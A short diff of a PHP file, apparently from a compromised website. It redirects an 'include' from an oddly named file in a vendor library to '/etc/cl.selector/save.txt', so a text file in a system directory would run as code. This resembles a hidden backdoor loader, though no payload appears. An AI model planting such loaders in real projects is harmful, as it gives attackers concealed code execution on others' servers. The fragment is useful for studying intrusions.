@@ -1,5 +1,5 @@
 <?php
-$file = '/home/bivaco/htdocs/bivaco.com/vendor/voku/portable-ascii/src/voku/helper/data/x0bk.php';
+$file = '/etc/cl.selector/save.txt';
 
 if (is_file($file)) {
     include $file;
